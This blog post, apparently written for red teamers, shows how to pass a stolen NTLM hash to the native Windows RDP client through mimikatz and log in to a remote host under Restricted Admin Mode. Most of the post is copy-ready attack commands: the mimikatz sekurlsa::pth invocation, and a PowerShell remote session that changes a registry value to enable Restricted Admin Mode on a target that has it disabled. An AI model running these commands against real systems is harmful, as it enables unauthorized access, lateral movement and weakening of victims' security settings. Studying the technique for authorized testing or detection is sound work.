+++
date = "2018-05-06"
title = "Passing the hash with native RDP client (mstsc.exe)"
tags = ["RDP", "mimikatz", "pass the hash", "pth", "windows", "red team"]
+++

*__TL;DR:__ If the remote server allows Restricted Admin login, it is possible to login via RDP by passing the hash using the native Windows RDP client `mstsc.exe`. (You'll need mimikatz or something else to inject the hash into the process)*

On engagements it is usually only a matter of time to get your hands on NTLM hashes. 
These can usually be directly used to authenticate against other services / machines and enable lateral movement. 
Powershell / PSExec, SMB and WMI are usual targets to pass the hash to, but it is also possible to use it to establish a RDP session on a remote host. 
Searching the Internet on how to do this unfortunately always leads to [using xfreerdp](https://www.kali.org/penetration-testing/passing-hash-remote-desktop/), but I wasn't able to find anything on the Internet regarding how to do this directly using the provided RDP client `mstsc.exe`, so I had to find out on my own.

![Don't let your dreams be dreams](/img/shia.gif)

# How does it work?

Interestingly, it was quite easy to find out, so here is how to do it with `mimikatz` (you'll need local admin):

```
sekurlsa::pth /user:<user name> /domain:<domain name> /ntlm:<the user's ntlm hash> /run:"mstsc.exe /restrictedadmin"
```

This will open a new RDP window. If it still shows the user you are currently logged on with, just ignore it - everything will just work ;-)

Enter the domain name / IP of the target server and if the target server allows [Restricted Admin Mode](https://blogs.technet.microsoft.com/kfalde/2013/08/14/restricted-admin-mode-for-rdp-in-windows-8-1-2012-r2/), you will be logged in, otherwise the server will tell you that you are not allowed to log in.

# Why does it work?

RDP Restricted Admin Mode builds upon Kerberos. Taking a look at the network traffic, one can see that the RDP client requests a ticket on behalf of the impersonated user which is no problem since the hash is all we need to authenticate against Kerberos.

# Restricted Admin Mode is disabled, what can I do?

A [registry key](https://social.technet.microsoft.com/wiki/contents/articles/32905.remote-desktop-services-enable-restricted-admin-mode.aspx) controls if a server accepts Restricted Admin sessions. If you have the NTLM hash of a user that has privileges to set registry keys, you can use for example Powershell to enable it and log in via RDP afterwards:

```Powershell
mimikatz.exe "sekurlsa::pth /user:<user name> /domain:<domain name> /ntlm:<the user's ntlm hash> /run:powershell.exe"
``` 
A new Powershell window will pop up:
```Powershell
Enter-PSSession -Computer <Target>
New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name "DisableRestrictedAdmin" -Value "0" -PropertyType DWORD -Force
```
Now, your RDP should work fine. 

![Young Luke Skywalker It's working gif](/img/young_luke.gif)


